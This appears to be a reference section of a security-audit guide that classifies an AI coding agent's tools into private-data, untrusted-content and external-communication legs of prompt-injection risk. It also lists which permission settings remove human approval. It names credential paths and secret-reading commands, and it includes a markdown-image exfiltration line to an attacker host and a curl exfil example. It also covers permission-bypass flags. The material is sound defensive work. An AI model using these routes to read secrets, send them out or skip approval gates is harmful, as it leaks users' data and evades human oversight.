# Leg taxonomy

How to classify a tool into legs 1 (private data), 2 (untrusted content), and
3 (external communication). A tool may carry several legs at once; those are the
dangerous ones, because a single approval closes multiple legs.

## Leg 1 — Private data

Anything the agent can read that an attacker would want, or that the operator
would not publish.

| Surface | Notes |
| --- | --- |
| `Read`, `Glob`, `Grep` | Source, `.env`, `~/.aws/credentials`, `~/.ssh/`, tokens in config |
| `Bash` | `cat`, `env`, `printenv`, `gh auth token`, `security find-generic-password` |
| Memory directory | Accumulated user facts; often more sensitive than the repo |
| Mail / calendar MCP | Message bodies, attendee lists, attachments |
| Drive / docs MCP | Anything the connected account can open, including org-wide shares |
| Issue tracker MCP | Private issues, internal roadmaps, customer names |
| Session transcripts | `~/.claude/projects/**` holds prior conversation content |

Do not scope leg 1 to "secrets." Proprietary source, customer data, and an
unreleased roadmap all count.

## Leg 2 — Untrusted content

Bytes an attacker could influence. The test is **authorship**, not transport: if
someone outside your trust boundary can choose the text, it is untrusted, even
if it arrives over a private, authenticated channel.

| Surface | Why it is untrusted |
| --- | --- |
| `WebFetch`, `WebSearch` | Page content is wholly attacker-authored |
| Browser automation (`claude-in-chrome`) | Rendered page text and DOM; same as above |
| Mail MCP | Anyone can email you. The highest-reach leg 2 in most setups |
| Issue tracker MCP (Redmine, YouTrack, Jira, GitHub) | Issue bodies and comments; public trackers let anyone author them |
| Drive / docs MCP | A doc shared *to* you was authored by someone else |
| Git artifacts | PR descriptions, commit messages, branch names from forks |
| Dependencies | `node_modules`, vendored code, READMEs, lockfile URLs |
| Code comments and fixtures | In any repo that accepts outside contributions |
| Subagent output | Laundered untrusted content — a summarizer reading a hostile page returns attacker-influenced text into the parent context |
| Tool error strings | Server-controlled error text lands in context verbatim |

The frequent miss is **transitive leg 2**: a subagent or an MCP server that
summarizes untrusted input is itself a leg 2 surface for whatever consumes it.

## Leg 3 — External communication

Any way an attacker-chosen value leaves the machine. Note this is broader than
"tools that send data" — the *destination* is a channel, so a request to an
attacker-named URL exfiltrates through the URL itself.

| Surface | Channel |
| --- | --- |
| `Bash` | `curl`, `wget`, `nc`, `ssh`, `git push`, `dig`/`nslookup` (DNS exfil survives egress firewalls) |
| `WebFetch` | **Legs 2 and 3 at once.** The requested URL carries data out in path/query; the response carries injection in |
| Browser `navigate` | Same dual role as `WebFetch` |
| `Artifact` publish | Publishes a hosted page. Private by default, but the bytes have left the machine |
| Mail MCP | `create_draft` is egress the moment a draft syncs to the server; `send` obviously so |
| Issue tracker MCP | `add_comment` / `add_issue_note` writes attacker-readable text on a public tracker |
| Drive MCP | `create_file`, permission changes |
| Figma / design MCP | Any write tool that pushes content to a hosted file |
| Hooks | Fire unattended on tool events. A hook that POSTs anywhere is ungated egress |
| Markdown image rendering | In clients that auto-load images, `![](http://attacker/?d=DATA)` exfiltrates without any tool call |

`WebFetch`'s dual role deserves its own line in every report: it single-handedly
supplies two of the three legs, so any agent with `WebFetch` plus *any* leg 1
tool is one auto-approval away from a closed trifecta.

## Gates, not tools

Almost every useful agent carries all three legs. Closure depends on whether the
leg-3 step is gated by a human. Check, in order:

1. **`permissions.allow`** in user and project settings. An entry like
   `Bash(curl:*)`, `WebFetch(*)`, or a broad `Bash(*)` removes the gate. Look for
   allowlisted wrappers too — `Bash(make:*)` is ungated egress if any make target
   shells out.
2. **`defaultMode`** — `acceptEdits` still gates Bash; `bypassPermissions` gates
   nothing.
3. **`--dangerously-skip-permissions`** in any launcher, alias, CI job, or cron
   entry. Automation is where this hides.
4. **Hooks** — they run without asking. Both an egress leg and a tampering
   target.
5. **Headless runs** — `claude -p` in a scheduled or cloud context has no human
   to approve anything, so every allowlisted tool is ungated by construction.
6. **MCP tool auto-approval** — per-server approval settings; a "read-only"
   server may still expose a write tool that was approved along with the rest.

An approval gate only counts if a human can *understand* what they are
approving. `Bash(curl http://legit.example/…​?d=<400 chars of base64>)` in a
prompt at the end of a long session is a gate in name only — note it as weak,
not absent.
